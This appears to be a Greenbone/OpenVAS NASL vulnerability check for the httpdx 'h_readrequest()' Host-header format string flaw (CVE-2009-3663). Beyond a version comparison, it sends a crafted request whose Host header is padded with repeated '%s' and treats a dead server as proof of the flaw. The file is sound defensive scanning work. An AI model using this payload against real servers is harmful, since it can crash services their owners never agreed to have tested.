if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800961" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-10-23 16:18:41 +0200 (Fri, 23 Oct 2009)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-2009-3663" );
	script_name( "httpdx 'h_readrequest()' Host Header Format String Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/36734" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/9657" );
	script_xref( name: "URL", value: "http://www.vupen.com/english/advisories/2009/2654" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_MIXED_ATTACK );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_httpdx_server_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "httpdx/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to crash an affected server or
  execute arbitrary code via a specially crafted request." );
	script_tag( name: "affected", value: "httpdx Web Server version 1.4 and prior on windows." );
	script_tag( name: "insight", value: "A format string error exists in the 'h_readrequest()' [httpd_src/http.cpp]
  function when processing the HTTP 'Host:' header." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Upgrade to httpdx Server version 1.4.1 or later." );
	script_tag( name: "summary", value: "The host is running httpdx Web Server and is prone to Format String
  vulnerability." );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("version_func.inc.sc");
httpdxPort = http_get_port( default: 80 );
httpdxVer = get_kb_item( "httpdx/" + httpdxPort + "/Ver" );
if(isnull( httpdxVer )){
	exit( 0 );
}
if(!safe_checks()){
	useragent = http_get_user_agent();
	sndReq = NASLString( "GET /", " HTTP/1.1\r\n", "VT: deflate,gzip;q=0.3\r\n", "Connection: VT, close\r\n", "Host: ", crap( length: 32, data: "%s" ), "\r\n", "User-Agent: ", useragent, "\r\n\r\n" );
	rcvRes = http_send_recv( port: httpdxPort, data: sndReq );
	rcvRes = http_send_recv( port: httpdxPort, data: sndReq );
	if(isnull( rcvRes )){
		security_message( port: httpdxPort );
		exit( 0 );
	}
}
if(version_is_less( version: httpdxVer, test_version: "1.4.1" )){
	report = report_fixed_ver( installed_version: httpdxVer, fixed_version: "1.4.1" );
	security_message( port: httpdxPort, data: report );
}
exit( 99 );

